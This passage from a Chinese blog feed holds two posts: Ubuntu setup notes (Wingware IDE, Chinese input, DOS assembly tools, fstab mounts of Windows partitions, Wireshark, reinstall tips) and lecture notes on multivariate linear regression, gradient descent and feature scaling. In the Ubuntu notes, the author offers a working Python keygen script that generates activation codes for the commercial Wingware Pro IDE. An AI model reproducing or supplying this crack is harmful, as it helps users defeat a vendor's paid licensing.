title="Wingware"></a>Wingware</h3><ul><li>这是一个很牛的PythonIDE</li><li>官网地址:<a href="http://www.wingware.com/" target="_blank" rel="noopener">http://www.wingware.com/</a></li><li>Pro版本为商业版本,可<a href="http://blog.csdn.net/u011128775/article/details/70140255" target="_blank" rel="noopener">破解</a></li><li>破解脚本,注意修改里面的LicenseID和RequestCode即可<pre class=" language-python"><code class="language-python"><span class="token comment" spellcheck="true">#!/usr/bin/env python3</span>LicenseID<span class="token operator">=</span><span class="token string">'CN823-12345-12345-67891'</span>RequestCode<span class="token operator">=</span><span class="token string">'RL625-QV8EM-EHT8Y-G5XW8'</span><span class="token keyword">import</span> hashlibB16 <span class="token operator">=</span> <span class="token string">'0123456789ABCDEF'</span>B30 <span class="token operator">=</span> <span class="token string">'123456789ABCDEFGHJKLMNPQRTVWXY'</span><span class="token keyword">def</span> <span class="token function">B</span><span class="token punctuation">(</span>n<span class="token punctuation">,</span>f<span class="token punctuation">,</span>t<span class="token punctuation">)</span><span class="token punctuation">:</span>xx <span class="token operator">=</span> <span class="token number">0</span><span class="token keyword">for</span> d <span class="token keyword">in</span> str<span class="token punctuation">(</span>n<span class="token punctuation">)</span><span class="token punctuation">:</span>  xx <span class="token operator">=</span> xx <span class="token operator">*</span> len<span class="token punctuation">(</span>f<span class="token punctuation">)</span> <span class="token operator">+</span> f<span class="token punctuation">.</span>index<span class="token punctuation">(</span>d<span class="token punctuation">)</span>res <span class="token operator">=</span> <span class="token string">''</span><span class="token keyword">while</span> xx <span class="token operator">></span> <span class="token number">0</span><span class="token punctuation">:</span>  res<span class="token operator">=</span>t<span class="token punctuation">[</span>int<span class="token punctuation">(</span>xx<span class="token operator">%</span>len<span class="token punctuation">(</span>t<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">]</span><span class="token operator">+</span>res  xx<span class="token operator">//=</span>len<span class="token punctuation">(</span>t<span class="token punctuation">)</span><span class="token keyword">return</span> res<span class="token keyword">def</span> <span class="token function">S</span><span class="token punctuation">(</span>D<span class="token punctuation">)</span><span class="token punctuation">:</span>r <span class="token operator">=</span> B<span class="token punctuation">(</span><span class="token string">''</span><span class="token punctuation">.</span>join<span class="token punctuation">(</span><span class="token punctuation">[</span>c <span class="token keyword">for</span> i<span class="token punctuation">,</span>c <span class="token keyword">in</span> enumerate<span class="token punctuation">(</span>D<span class="token punctuation">)</span> <span class="token keyword">if</span> i<span class="token operator">//</span><span class="token number">2</span><span class="token operator">*</span><span class="token number">2</span><span class="token operator">==</span>i<span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">,</span>B16<span class="token punctuation">,</span>B30<span class="token punctuation">)</span><span class="token keyword">while</span> len<span class="token punctuation">(</span>r<span class="token punctuation">)</span> <span class="token operator">&lt;</span> <span class="token number">17</span><span class="token punctuation">:</span>  r <span class="token operator">=</span> <span class="token string">'1'</span> <span class="token operator">+</span> r<span class="token keyword">return</span> r<span class="token keyword">def</span> <span class="token function">A</span><span class="token punctuation">(</span>c<span class="token punctuation">)</span><span class="token punctuation">:</span><span class="token keyword">return</span> c<span class="token punctuation">[</span><span class="token punctuation">:</span><span class="token number">5</span><span class="token punctuation">]</span><span class="token operator">+</span><span class="token string">'-'</span><span class="token operator">+</span>c<span class="token punctuation">[</span><span class="token number">5</span><span class="token punctuation">:</span><span class="token number">10</span><span class="token punctuation">]</span><span class="token operator">+</span><span class="token string">'-'</span><span class="token operator">+</span>c<span class="token punctuation">[</span><span class="token number">10</span><span class="token punctuation">:</span><span class="token number">15</span><span class="token punctuation">]</span><span class="token operator">+</span><span class="token string">'-'</span><span class="token operator">+</span>c<span class="token punctuation">[</span><span class="token number">15</span><span class="token punctuation">:</span><span class="token punctuation">]</span>h <span class="token operator">=</span> hashlib<span class="token punctuation">.</span>sha1<span class="token punctuation">(</span><span class="token punctuation">)</span>h<span class="token punctuation">.</span>update<span class="token punctuation">(</span>RequestCode<span class="token punctuation">.</span>encode<span class="token punctuation">(</span><span class="token string">'utf-8'</span><span class="token punctuation">)</span><span class="token operator">+</span>LicenseID<span class="token punctuation">.</span>encode<span class="token punctuation">(</span><span class="token string">'utf-8'</span><span class="token punctuation">)</span><span class="token punctuation">)</span>lichash<span class="token operator">=</span>A<span class="token punctuation">(</span>RequestCode<span class="token punctuation">[</span><span class="token punctuation">:</span><span class="token number">3</span><span class="token punctuation">]</span><span class="token operator">+</span>S<span class="token punctuation">(</span>h<span class="token punctuation">.</span>hexdigest<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span>upper<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">)</span>data<span class="token operator">=</span><span class="token punctuation">[</span><span class="token number">23</span><span class="token punctuation">,</span><span class="token number">161</span><span class="token punctuation">,</span><span class="token number">47</span><span class="token punctuation">,</span><span class="token number">9</span><span class="token punctuation">]</span>tmp<span class="token operator">=</span><span class="token number">0</span>realcode<span class="token operator">=</span><span class="token string">''</span><span class="token keyword">for</span> i <span class="token keyword">in</span> data<span class="token punctuation">:</span><span class="token keyword">for</span> j <span class="token keyword">in</span> lichash<span class="token punctuation">:</span>  tmp<span class="token operator">=</span><span class="token punctuation">(</span>tmp<span class="token operator">*</span>i<span class="token operator">+</span>ord<span class="token punctuation">(</span>j<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token operator">&amp;</span><span class="token number">0xFFFFF</span>realcode<span class="token operator">+=</span>format<span class="token punctuation">(</span>tmp<span class="token punctuation">,</span><span class="token string">'=05X'</span><span class="token punctuation">)</span>tmp<span class="token operator">=</span><span class="token number">0</span>D<span class="token operator">=</span>B<span class="token punctuation">(</span>realcode<span class="token punctuation">,</span>B16<span class="token punctuation">,</span>B30<span class="token punctuation">)</span><span class="token keyword">while</span> len<span class="token punctuation">(</span>D<span class="token punctuation">)</span> <span class="token operator">&lt;</span> <span class="token number">17</span><span class="token punctuation">:</span>D <span class="token operator">=</span> <span class="token string">'1'</span> <span class="token operator">+</span> D<span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"The Activation Code is: "</span><span class="token operator">+</span>A<span class="token punctuation">(</span><span class="token string">'AXX'</span><span class="token operator">+</span>D<span class="token punctuation">)</span><span class="token punctuation">)</span></code></pre></li><li>在Ubuntu下无法输入中文<pre><code>dpkg -L fcitx-frontend-qt5</code></pre></li></ul><p><img src="https://raw.githubusercontent.com/fengwenhua/ImageBed/master/1530168377.jpg" alt></p><pre><code>dpkg -L wingide6 | grep platforminputcontexts</code></pre><p><img src="https://raw.githubusercontent.com/fengwenhua/ImageBed/master/1530168371.jpg" alt></p><pre><code>sudo cp /usr/lib/x86_64-linux-gnu/qt5/plugins/platforminputcontexts/libfcitxplatforminputcontextplugin.so  /usr/lib/wingide6/bin/runtime-qt5.5/plugins/platforminputcontexts</code></pre><ul><li>常用技巧<ul><li>F1,F2:上下左右框的开合</li><li>Edit-&gt;Preferences-&gt;User Interface-&gt;Color Palete选择主题</li><li>显示行号:Edit -&gt; Show(Hide) Line Numbers</li><li>TAB:自动补全</li><li>设置补全键：Edit-&gt;Keybord Personality-&gt;Config auto..-&gt;Editors-&gt;Auto-completion</li></ul></li></ul><p><img src="https://raw.githubusercontent.com/fengwenhua/ImageBed/master/1530168350.jpg" alt></p><p><img src="https://raw.githubusercontent.com/fengwenhua/ImageBed/master/1530168339.jpg" alt></p><h3 id="安装汇编环境"><a href="#安装汇编环境" class="headerlink" title="安装汇编环境"></a>安装汇编环境</h3><pre class=" language-shell"><code class="language-shell">sudo apt install dosemu# 将下载下来dos程序如masm复制到`~/.dosemu/drives/d/bin`中即可</code></pre><h5 id="编写汇编代码"><a href="#编写汇编代码" class="headerlink" title="编写汇编代码"></a>编写汇编代码</h5><ol><li>在dos下直接输入<code>edit</code>,用鼠标选择<code>File-&gt;New</code>,开始编写,然后选择<code>Save as</code>保存为<code>.asm</code>后缀文件即可</li><li>终端进入<code>~/.dosemu/drives/c</code>目录下,用vim编写</li></ol><h3 id="开机自动挂载Windows分区"><a href="#开机自动挂载Windows分区" class="headerlink" title="开机自动挂载Windows分区"></a>开机自动挂载Windows分区</h3><ol><li><p>前期准备<br>(1) 查看系统磁盘号</p><pre class=" language-shell"><code class="language-shell">sudo fdisk -l</code></pre><p><img src="https://raw.githubusercontent.com/fengwenhua/ImageBed/master/1530168282.jpg" alt></p><p>(2) 查看磁盘类型</p><pre class=" language-shell"><code class="language-shell">sudo blkid</code></pre></li><li><p>修改配置文件</p><pre class=" language-shell"><code class="language-shell">sudo gedit /etc/fstab</code></pre><p>(1) 配置文件包括下面几项:</p><table><thead><tr><th>内容</th><th>例子</th></tr></thead><tbody><tr><td>分区定位</td><td>可以给磁盘号，UUID或LABEL，例如：/dev/sda2，UUID=6E9ADAC29ADA85CD或LABEL=software</td></tr><tr><td>具体挂载点的位置</td><td>例如：/media/C</td></tr><tr><td>挂载磁盘类型</td><td>linux分区一般为ext4，windows分区一般为ntfs</td></tr><tr><td>挂载参数</td><td>一般为defaults</td></tr><tr><td>磁盘备份</td><td>默认为0，不备份</td></tr><tr><td>磁盘检查</td><td>默认为0，不检查</td></tr></tbody></table><p>(2) 配置图如下:</p><p><img src="https://raw.githubusercontent.com/fengwenhua/ImageBed/master/1530168314.jpg" alt></p><pre class=" language-shell"><code class="language-shell"># disk for Window10# c for Windows10UUID="3C5002DB50029BB0" /media/hua/3C5002DB50029BB0 ntfs    defaults    0   0# d for Windows10UUID="1C963ACF963AA962" /media/hua/软件安装处    ntfs    defaults    0   0# e for Windows10UUID="5CA074DBA074BD58" /media/hua/资料与娱乐    ntfs    defaults    0   0# f for Windows10UUID="4AD483BBD483A7B1" /media/hua/软件   ntfs    defaults    0   0# g for Windows10UUID="32C290FDC290C68F" /media/hua/虚拟机及代码   ntfs    defaults    0   0</code></pre></li><li><p>检查并挂载新添加项:</p><pre class=" language-shell"><code class="language-shell">sudo mount -a</code></pre><ul><li>改命令会在<code>/etc/fstab</code>中的项全部挂载,如果有错,则会提示错误,然后根据错误找出原因修改</li></ul></li></ol><h3 id="安装wireshark"><a href="#安装wireshark" class="headerlink" title="安装wireshark"></a>安装wireshark</h3><ul><li>wireshark是一个网络抓包分析工具<pre class=" language-shell"><code class="language-shell">sudo apt install wireshark    # 弹框选"YES"sudo usermod -a -G wireshark $USER</code></pre></li></ul><h3 id="为重装系统做准备"><a href="#为重装系统做准备" class="headerlink" title="为重装系统做准备"></a>为重装系统做准备</h3><p>在自己的系统配置到差不多的时候，可以</p><pre class=" language-shell"><code class="language-shell">sudo apt-mark showmanual > .install</code></pre><p>在需要重装系统的时候，执行</p><pre class=" language-shell"><code class="language-shell">sudo apt install $(cat .install)</code></pre><p>就可以安装之前选择的所有软件了～<br>当然/home需要单独分区</p><h3 id="xx-net的ipv6"><a href="#xx-net的ipv6" class="headerlink" title="xx-net的ipv6"></a>xx-net的ipv6</h3><pre class=" language-shell"><code class="language-shell">sudo apt install miredo重启sudo miredo</code></pre><h1 id="打开启动应用管理"><a href="#打开启动应用管理" class="headerlink" title="打开启动应用管理"></a>打开启动应用管理</h1><pre class=" language-shell"><code class="language-shell">gnome-session-properties</code></pre>]]></content>
      
      
      <categories>
          
          <category> Linux </category>
          
          <category> Ubuntu </category>
          
      </categories>
      
      
        <tags>
            
            <tag> ubuntu配置 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>第四章 多变量线性回归(Linear Regression with Multiple Variables)</title>
      <link href="/2018/11/15/di-si-zhang-duo-bian-liang-xian-xing-hui-gui-linear-regression-with-multiple-variables/"/>
      <url>/2018/11/15/di-si-zhang-duo-bian-liang-xian-xing-hui-gui-linear-regression-with-multiple-variables/</url>
      
        <content type="html"><![CDATA[<h2 id="Multiple-Features（多维特征）"><a href="#Multiple-Features（多维特征）" class="headerlink" title="Multiple Features（多维特征）"></a>Multiple Features（多维特征）</h2><blockquote><p> 在这段视频中 我们将开始 介绍一种新的 <strong>更为有效的线性回归形式 这种形式适用于多个变量或者多特征量的情况</strong></p></blockquote><ul><li>在之前我们学习过的 线性回归中 我们只有一个单一特征量 房屋面积 x 我们希望用这个特征量 来预测 房子的价格 这就是我们的假设</li></ul><p><img src="https://raw.githubusercontent.com/fengwenhua/ImageBed/master/_1526603422_2029872331_1540481948" alt="_1526603422_2029872331_1540481948_1526603422_2029872331.png"></p><a id="more"></a><ul><li>但是想象一下 如果我们<strong>不仅有房屋面积 作为预测房屋 价格的特征量 或者变量 我们还知道 卧室的数量 楼层的数量以及房子的使用年限</strong> 这样就给了我们 更多可以用来 预测房屋价格的信息</li></ul><p><img src="https://raw.githubusercontent.com/fengwenhua/ImageBed/master/_1526603455_433733145_1540741332" alt="_1526603455_433733145_1540741332_1526603455_433733145.png"></p><ul><li>先简单介绍一下记法 我们开始的时候就提到过 我要用 x 下标1 x 下标2 等等 来表示 这种情况下的四个特征量 然后仍然用 Y来表示我们 所想要预测的输出变量</li></ul><p><img src="https://raw.githubusercontent.com/fengwenhua/ImageBed/master/_1526603471_617319148_1540741358" alt="_1526603471_617319148_1540741358_1526603471_617319148.png"></p><ul><li>让我们来看看更多的表示方式 现在我们有四个特征量 我要用<code>小写n</code> 来表示<strong>特征量的数目</strong> 因此在这个例子中 我们的n等于4 因为你们看 我们有 1 2 3 4 共4个特征量 这里的n和我们之前 使用的n不同 之前我们是用的“<code>m</code>”来<strong>表示样本的数量</strong> 所以如果你有47行 那么m就是这个表格里面的行数 或者说是训练样本数</li></ul><p><img src="https://raw.githubusercontent.com/fengwenhua/ImageBed/master/_1526603493_859265827_1540741432" alt="_1526603493_859265827_1540741432_1526603493_859265827.png"></p><ul><li>然后我要用<code>x 上标 (i)</code> 来表示<strong>第i个 训练样本的 输入特征值</strong> 举个具体的例子来说 <code>x上标 (2)</code> 就是表示<strong>第二个 训练样本的特征向量</strong> 因此这里 x(2)就是向量 [1416, 3, 2, 40] 因为这四个数字对应了 我用来预测房屋价格的 第二个房子的 四个特征量 因此在这种记法中 这个上标2 就是训练集的一个索引 而不是x的2次方 这个2就对应着 你所看到的表格中的第二行 即我的第二个训练样本</li></ul><p><img src="https://raw.githubusercontent.com/fengwenhua/ImageBed/master/20181104203747.png" alt></p><ul><li>x上标(2) 这样表示 就是一个四维向量 事实上更普遍地来说 这是n维的向量 用这种表示方法 x上标2就是一个向量 因此 我用<code>x上标(i) 下标j</code> 来表示 <strong>第i个训练样本的 第j个特征量</strong> 因此具体的来说 <code>x上标(2)下标3</code>代表着 <strong>第2个训练样本里的第3个特征量</strong> 对吧？ 这个是3 我写的不太好看 所以说x上标(2)下标3就等于2</li></ul><p><img src="https://raw.githubusercontent.com/fengwenhua/ImageBed/master/20181104204137.png" alt></p><ul><li>既然我们有了多个特征量 让我们继续讨论一下 我们的假设形式应该是怎样的 这是我们之前使用的假设形式 x就是我们唯一的特征量 但现在我们有了多个特征量 我们就不能再 使用这种简单的表示方式了 取而代之的 我们将把线性回归的假设 改成这样 θ0加上 θ1 乘以 x1 加上 θ2乘以x2 加上 θ3 乘以x3 加上θ4乘以x4 然后如果我们有n个特征量 那么我们要将所有的n个特征量相加 而不是四个特征量 我们需要对n个特征量进行相加</li></ul><p><img src="https://raw.githubusercontent.com/fengwenhua/ImageBed/master/20181104204157.png" alt></p><ul><li>举个具体的例子 在我们的设置的参数中 我们可能有h(x)等于 <code>80 + 0.1 x1 + 0.01x2 + 3x3 - 2x4</code> 这就是一个 假设的范例 别忘了 假设是为了预测 大约以千刀为单位的房屋价格 就是说 一个房子的价格 可以是 80 k加上 0.1乘以x1 也就是说 每平方尺100美元 然后价格 会随着楼层数的增加 再继续增长 x2是楼层数 接着价格会继续增加 随着卧室数的增加 因为x3是 卧室的数量 但是呢 房子的价格会 随着使用年数的增加 而贬值</li></ul><p><img src="https://raw.githubusercontent.com/fengwenhua/ImageBed/master/20181104204236.png" alt></p><ul><li>这是重新改写过的假设的形式 接下来 我要来介绍一点 简化这个等式的表示方式</li></ul><p><img src="https://raw.githubusercontent.com/fengwenhua/ImageBed/master/20181104204258.png" alt></p><ul><li>为了表示方便 我要将<code>x下标0的值设为1</code></li></ul><p><img src="https://raw.githubusercontent.com/fengwenhua/ImageBed/master/20181104204355.png" alt></p><ul><li>具体而言 这意味着 对于第i个样本 都有一个向量x上标(i) 并且x上标(i) 下标0等于1 你可以认为我们 定义了一个额外的第0个特征量 因此 我过去有n个特征量 因为我们有x1 x2 直到xn 由于我另外定义了 额外的第0个特征向量 并且它的取值 总是1 所以我现在的特征向量x 是一个从0开始标记的 n+1维的向量</li></ul><p><img src="https://raw.githubusercontent.com/fengwenhua/ImageBed/master/20181104204411.png" alt></p><ul><li>所以现在就是一个 n+1维的特征量向量 但我要从0开始标记 同时 我也想把我的参数 都看做一个向量 所以我们的参数就是 我们的<code>θ0 θ1 θ2 等等</code> 直到θn 我们要把 所有的参数都写成一个向量 <code>θ0 θ1...</code>一直到 直到θn 这里也有一个从0开始标记的矢量 下标从0开始 这是另外一个</li></ul><p><img src="https://raw.githubusercontent.com/fengwenhua/ImageBed/master/20181104204425.png" alt></p><ul><li>所以我的假设 现在可以写成θ0乘以x0 加上θ1乘以x1直到 θn 乘以xn 这个等式 和上面的等式是一样的 因为你看 x0等于1</li></ul><p><img src="https://raw.githubusercontent.com/fengwenhua/ImageBed/master/20181104204451.png" alt></p><ul><li>下面 我要 把这种形式<code>假设等式</code> 写成 <code>θ转置乘以X</code> 取决于你对 向量内积有多熟悉 如果你展开 θ转置乘以X 那么就得到 θ0 θ1直到θn 这个就是θ转置 实际上 这就是一个 n+1乘以1维的矩阵 也被称为行向量 用行向量 与X向量相乘 X向量是 x0 x1等等 直到xn 因此内积就是 θ转置乘以X 就等于这个等式</li></ul><p><img src="https://raw.githubusercontent.com/fengwenhua/ImageBed/master/20181104204531.png" alt></p><ul><li>这就为我们提供了一个 表示假设的 更加便利的形式 即<strong>用参数向量θ以及 特征向量X的内积</strong> 这就是改写以后的 表示方法 这样的表示习惯 就让我们 可以以这种紧凑的形式写出假设 这就是多特征量情况下的假设形式 起另一个名字 就是 所谓的<code>多元线性回归</code></li><li><code>多元</code>一词 也就是<strong>用来预测的多个特征量 或者变量 就是一种更加好听的说法</strong>罢了</li></ul><h2 id="Gradient-Descent-for-Multiple-Variables-多变量梯度下降"><a href="#Gradient-Descent-for-Multiple-Variables-多变量梯度下降" class="headerlink" title="Gradient Descent for Multiple Variables(多变量梯度下降)"></a>Gradient Descent for Multiple Variables(多变量梯度下降)</h2><blockquote><p>在之前的视频中 我们谈到了一种线性回归的假设形式 这是一种有多特征或者是多变量的形式 在本节视频中 我们将会谈到如何找到满足这一假设的<strong>参数</strong> 尤其是<strong>如何使用梯度下降法 来解决多特征的线性回归问题</strong></p></blockquote><ul><li>为尽快让你理解 现假设现有多元线性回归 并约定 x0=1 该模型的参数是从 θ0 到 θn 不要认为这是 n+1 个单独的参数 你可以把这 n+1 个 θ 参数想象成一个 n+1 维的向量 θ 所以 你现在就可以把这个模型的参数 想象成其本身就是一个<code>n+1 维的向量</code> 我们的代价函数是从 θ0 到 θn 的函数 J 并给出了误差项平方的和 但同样地 不要把函数 J 想成是一个关于 n+1 个自变量的函数 而是看成带有一个 <code>n+1 维向量的函数</code></li></ul><p><img src="https://raw.githubusercontent.com/fengwenhua/ImageBed/master/20181104204601.png" alt></p><ul><li>这就是梯度下降法 我们将会<strong>不停地用 θj 减去 α 倍的导数项 来替代 θj</strong> 同样的方法 我们写出函数J(θ) 因此 θj 被更新成 θj 减去学习率 α 与对应导数的乘积 就是代价函数的对参数 θj 的偏导数 当我们实现梯度下降法后 你可以仔细观察一下 尤其是它的偏导数项</li></ul><p><img src="https://raw.githubusercontent.com/fengwenhua/ImageBed/master/20181104204617.png" alt></p><ul><li>下面是我们当特征 n=1 时 梯度下降的情况 我们有两条针对参数 θ0 和 θ1 不同的更新规则 希望这些对你来说并不陌生 这一项是代价函数里部分求导的结果 就是<strong>代价函数相对于 θ0 的偏导数</strong></li></ul><p><img src="https://raw.githubusercontent.com/fengwenhua/ImageBed/master/20181104204640.png" alt></p><ul><li>同样 对参数 θ1 我们有另一个更新规则  仅有的一点区别是 当我们之前只有一个特征 我们称该特征为x(i) 但现在我们在新符号里 我们会标记它为 x 上标 (i) 下标1 来表示我们的特征 以上就是当我们仅有一个特征时候的算法</li></ul><p><img src="https://raw.githubusercontent.com/fengwenhua/ImageBed/master/20181104204701.png" alt></p><ul><li>下面我们来讲讲<strong>当有一个以上特征时候的算法</strong> 现有数目远大于1的很多特征 我们的梯度下降更新规则变成了这样 有些同学可能知道微积分 如果你看看代价函数 <strong>代价函数 J 对参数 θj 求偏导数</strong> 你会发现 求其偏导数的那一项 我已经用蓝线圈出来了 如果你实现了这一步 你将会得到多元线性回归的梯度下降算法</li></ul><p><img src="https://raw.githubusercontent.com/fengwenhua/ImageBed/master/20181104204716.png" alt></p><ul><li>最后 我想让你明白 为什么新旧两种算法实际上是一回事儿 或者说为什么这两个是类似的算法 为什么它们都是梯度下降算法 考虑这样一个情况 有两个或以上个数的特征 同时我们有对θ1、θ2、θ3的三条更新规则 当然可能还有其它参数 如果你观察θ0的更新规则  你会发现这跟之前 n=1的情况相同 它们之所以是等价的 这是因为在我们的标记约定里有 x(i)0=1 也就是 我用品红色圈起来的两项是等价的 同样地 如果你观察 θ1 的更新规则 你会发现这里的这一项是 和之前对参数θ1的更新项是等价的</li></ul><p><img src="https://raw.githubusercontent.com/fengwenhua/ImageBed/master/20181104204732.png" alt></p><ul><li>在这里我们只是用了新的符号x(i)1来表示我们的第一个特征 现在我们有个更多的特征 那么就可以用与之前相同的更新规则 我们可以用同样的规则来处理 θ2 等其它参数 这张幻灯片的内容不少 请务必仔细理解 如果觉得幻灯片上数学公式没看懂 尽管暂停视频 请确保理解了再继续后面的学习 如果你将这些算法都实现了 那么你就可以直接应用到多元线性回归中了</li></ul><p><img src="https://raw.githubusercontent.com/fengwenhua/ImageBed/master/20181104204746.png" alt></p><h3 id="多变量梯度下降笔记"><a href="#多变量梯度下降笔记" class="headerlink" title="多变量梯度下降笔记"></a>多变量梯度下降笔记</h3><p><img src="https://raw.githubusercontent.com/fengwenhua/ImageBed/master/20181104204804.png" alt></p><p><img src="https://raw.githubusercontent.com/fengwenhua/ImageBed/master/20181104204811.png" alt></p><h2 id="Gradient-Descent-in-Practice-1-Feature-Sacling-梯度下降法实践1-特征缩放"><a href="#Gradient-Descent-in-Practice-1-Feature-Sacling-梯度下降法实践1-特征缩放" class="headerlink" title="Gradient Descent in Practice 1-Feature Sacling(梯度下降法实践1-特征缩放)"></a>Gradient Descent in Practice 1-Feature Sacling(梯度下降法实践1-特征缩放)</h2><blockquote><p>在这段视频 以及下一段视频中 我想告诉你一些关于 梯度下降运算中的实用技巧 在这段视频中 我会告诉你一个称为<code>特征缩放 (feature scaling)</code> 的方法</p></blockquote><ul><li>如果你有一个机器学习问题 这个问题有多个特征 如果你能确保这些特征 都处在一个相近的范围 我的意思是<strong>确保不同特征的取值 在相近的范围内,这样梯度下降法就能更快地收敛</strong></li><li>具体地说 假如你有一个具有两个特征的问题 其中 <code>x1</code> 是房屋面积大小 它的取值 在<code>0到2000</code>之间 <code>x2</code> 是卧室的数量 可能这个值 取值范围在<code>1到5</code>之间 如果你画出代价函数 J(θ) 的轮廓图 那么这个轮廓看起来 应该是像这样的 J(θ) 是一个关于 参数 θ0 θ1 和 θ2 的函数 但我要忽略 θ0 所以暂时不考虑 θ0 并假想一个函数的变量 只有 θ1 和 θ2 但如果 x1 的取值范围 远远大于 x2 的取值范围的话 那么最终画出来的 代价函数 J(θ) 的轮廓图 就会呈现出这样一种 <strong>非常偏斜 并且椭圆的形状 2000 和 5的比例</strong> 会让这个椭圆更加瘦长 所以 这是一个又瘦又高的 椭圆形轮廓图 就是这些非常高大细长的椭圆形 构成了代价函数 J(θ)</li></ul><p><img src="https://raw.githubusercontent.com/fengwenhua/ImageBed/master/20181104204851.png" alt></p><ul><li>而如果你用这个代价函数 来运行梯度下降的话 你要得到梯度值 <strong>最终可能 需要花很长一段时间 并且可能会来回波动 然后会经过很长时间 最终才收敛到<code>全局最小值</code></strong></li></ul><p><img src="https://raw.githubusercontent.com/fengwenhua/ImageBed/master/20181104204920.png" alt></p><ul><li>事实上 你可以想像 如果这些 轮廓再被放大一些的话 如果你画的再夸张一些 把它画的更细更长 那么可能情况会更糟糕 梯度下降的过程 可能更加缓慢 需要花更长的时间 反复来回振荡 最终才找到一条正确通往全局最小值的路</li></ul><p><img src="https://raw.githubusercontent.com/fengwenhua/ImageBed/master/20181104204943.png" alt></p><ul><li>在这样的情况下 一种有效的方法是进行<code>特征缩放(feature scaling)</code> 具体来说 把特征 x 定义为 房子的面积大小 除以2000的话 并且把 x2 定义为 卧室的数量除以5 那么这样的话 表示代价函数 J(θ) 的轮廓图的形状 就会变得偏移没那么严重 可能看起来更圆一些了</li></ul><p><img src="https://raw.githubusercontent.com/fengwenhua/ImageBed/master/20181104204956.png" alt></p><ul><li>如果你用这样的代价函数 来执行梯度下降的话 那么 梯度下降算法</li></ul><p><img src="https://raw.githubusercontent.com/fengwenhua/ImageBed/master/20181104205010.png" alt></p><ul><li>你可以从数学上来证明 梯度下降算法 就会找到一条 更捷径的路径通向全局最小 而不是像刚才那样 沿着一条让人摸不着头脑的路径 一条复杂得多的轨迹 来找到全局最小值 因此 通过特征缩放 通过”消耗掉”这些值的范围 在这个例子中 我们最终得到的两个特征 x1 和 x2 都在<code>0和1之间</code> 这样你得到的梯度下降算法 就会更快地收敛</li><li>更一般地 我们执行特征缩放时 我们通常的目的是 <strong>将特征的取值约束到 <code>-1 到 +1</code> 的范围内</strong> 你的特征 x0 是总是等于1 因此 这已经是在这个范围内 但<strong>对其他的特征 你可能需要通过<code>除以</code>不同的数 来让它们处于同一范围内</strong></li></ul><p><img src="https://raw.githubusercontent.com/fengwenhua/ImageBed/master/20181104205024.png" alt></p><ul><li><strong>-1 和 +1 这两个数字并不是太重要</strong> 所以 如果你有一个特征  x1 它的取值 在0和3之间 这没问题 如果你有另外一个特征 取值在-2 到 +0.5之间 这也没什么关系 这也非常接近 -1 到 +1的范围 这些都可以</li></ul><p><img src="https://raw.githubusercontent.com/fengwenhua/ImageBed/master/20181104205036.png" alt></p><ul><li>但如果你有另一个特征 比如叫 x3 假如它的范围 在 -100 到 +100之间 那么 这个范围 跟-1到+1就有很大不同了 所以 这可能是一个 不那么好的特征 类似地 如果你的特征在一个 非常非常小的范围内 比如另外一个特征 x4 它的范围在 0.0001和+0.0001之间 那么 这同样是一个 比-1到+1小得多的范围 比-1到+1小得多的范围 因此 我同样会认为这个特征也不太好</li></ul><p><img src="https://raw.githubusercontent.com/fengwenhua/ImageBed/master/20181104205059.png" alt></p><ul><li>所以 可能你认可的范围 也许可以大于 或者小于 -1 到 +1 但是也别太大 只要大得不多就可以接受 比如 +100 或者也别太小 比如这里的0.001 不同的人有不同的经验 但是我一般是这么考虑的 <strong>如果一个特征是在 <code>-3 到 +3</code> 的范围内 那么你应该认为 这个范围是可以接受的</strong> 但如果这个范围 大于了 -3 到 +3 的范围 我可能就要开始注意了 如果它的取值 在-1/3 到+1/3的话 我觉得 还不错 可以接受 或者是0到1/3 或-1/3到0 这些典型的范围 我都认为是可以接受的 但如果特征的范围 取得很小的话 比如像这里的 x4 你就要开始考虑进行特征缩放了</li><li>因此 总的来说 不用过于担心 你的特征是否在完全 相同的范围或区间内 但是只要他们都 <strong>只要它们足够接近的话 梯度下降法就会正常地工作</strong></li><li>除了在特征缩放中 将特征除以最大值以外 有时候我们也会进行一个 称为<code>均值归一化的工作(mean normalization)</code> 我的意思是这样的 如果你有一个特征 <code>xi</code> 你就用 <code>xi - μi</code> 来替换 通过这样做 <strong>让你的特征值 具有为0的平均值</strong> 很明显 我们不需要 把这一步应用到 x0中 因为 x0 总是等于1的 所以它不可能有 为0的的平均值</li><li>但是 对其他的特征来说 比如房子的大小 取值介于0到2000 并且假如 房子面积 的平均值 是等于1000的 那么你可以用这个公式 将 x1 的值变为 x1 减去平均值 μ1 再除以2000 类似地 如果你的房子有 五间卧室 并且平均一套房子有 两间卧室 那么你可以 使用这个公式 来归一化你的第二个特征 x2 在这两种情况下 你可以算出新的特征 x1 和 x2 这样它们的范围 可以在-0.5和+0.5之间 当然这肯定不对 x2的值实际上肯定会大于0.5 但很接近</li></ul><p><img src="https://raw.githubusercontent.com/fengwenhua/ImageBed/master/20181104205132.png" alt></p><ul><li>更一般的规律是 你可以用这样的公式 你可以用 <code>(x1 - μ1)/S1</code> 来替换原来的特征 x1 其中定义<code>μ1</code>的意思是 在训练集中 <strong>特征 x1 的平均值</strong> 而 <code>S1</code> 是 该特征值的范围 我说的范围是指 <strong>最大值减去最小值</strong>或者学过 标准差的同学可以记住 也可以把 S1 设为 变量的<code>标准差</code> 但其实用最大值减最小值就可以了 类似地 对于第二个 特征 x2 你也可以用同样的这个 特征减去平均值 再除以范围 来替换原特征 范围的意思依然是最大值减最小值 这类公式将 把你的特征 变成这样的范围 也许不是完全这样 但大概是这样的范围</li></ul><p><img src="https://raw.githubusercontent.com/fengwenhua/ImageBed/master/20181104205148.png" alt></p><ul><li>顺便提一下 有些同学可能比较仔细 如果我们用最大值减最小值 来表示范围的话 这里的5有可能应该是4 如果最大值为5 那么减去最小值1 这个范围值就是4 但不管咋说 这些取值 都是非常近似的 <strong>只要将特征转换为 相近似的范围 就都是可以的</strong> <strong>特征缩放其实 并不需要太精确 只是为了让梯度下降 能够运行得更快一点而已</strong></li><li>好的 现在你知道了 什么是特征缩放 通过使用这个简单的方法 你可以将梯度下降的速度变得更快 让梯度下降收敛所需的循环次数更少 这就是特征缩放 